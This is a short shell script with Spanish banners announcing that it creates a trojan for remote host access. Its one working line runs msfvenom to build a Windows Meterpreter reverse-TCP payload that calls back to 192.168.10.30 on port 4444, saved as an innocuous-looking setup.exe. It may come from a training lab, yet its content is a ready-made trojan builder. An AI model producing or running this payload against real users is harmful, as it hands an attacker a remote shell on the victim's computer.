echo "*********************************************"
echo "\e[93m******  EQUIPO AMARILLO **********\e[0m"
echo "\e[92****** CREANDO TU TROYANO*******\e[0m"
echo " ****PARA ACCESO REMOTO A HOST***** "
echo "    **********************      "
echo "         **********             "
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.10.30 LPORT=4444 -o /root/Desktop/setup.exe
echo "*****************************"
echo  "\e[93m********************\e[0m"

echo "   **** REVISA EL ESCRITORIO "

